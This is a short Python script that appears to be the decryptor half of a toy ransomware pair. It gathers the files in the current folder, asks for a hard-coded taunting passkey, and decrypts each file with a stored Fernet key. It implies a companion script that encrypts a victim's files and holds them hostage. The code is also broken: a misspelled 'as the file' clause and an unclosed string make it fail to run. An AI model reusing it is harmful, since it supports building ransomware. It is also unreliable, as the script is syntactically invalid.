

import os

from cryptography.fernet import Fernet
#scan

files = []

for file in os.listdir():
    if file == "encryptpasskey.py" or file =="thekey.key" or file == "dycryptpasskey.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
  secretkey = key.read()

secretphrase = "YOUAREABOZO!!9"

user_phrase = input("enter the passkey to dycrypt and recover files\n")

if user_phrase == secretphrase:
    for file in files:
         with open(file, "rb") as the file:
             contents = thefile.read()
         contents_decrypted = Fernet(secretkey).decrypt(contents)
         with open(file, "wb") as thefile:
             thefile.write(contents_decrypted)
         print("files decrypted")
else:
    print("wrong passkey)


  
